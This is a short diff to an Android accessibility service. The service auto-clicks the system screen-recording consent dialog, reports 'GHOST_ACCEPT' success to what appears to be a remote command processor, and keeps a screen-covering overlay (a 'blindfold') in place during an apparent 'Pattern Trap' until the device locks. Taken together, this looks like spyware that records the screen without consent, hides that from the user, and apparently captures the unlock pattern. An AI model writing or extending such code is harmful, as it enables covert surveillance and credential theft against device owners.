@@ -318,7 +318,13 @@ class MyAccessibilityService : AccessibilityService() {
                     node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                     DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
                     ScreenRecordManager.expectedMode = "" // Disarm
-                    DimmerManager.removeOverlay(this) // Remove the blindfold
+                    
+                    if (!ScreenRecordManager.isPatternTrap) {
+                        DimmerManager.removeOverlay(this) // Remove blindfold immediately if standard record
+                    } else {
+                        DebugLogger.log("GHOST_ACCEPT", "Pattern Trap active. Retaining blindfold until hardware lock.")
+                    }
+                    
                     CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
                     break
                 }
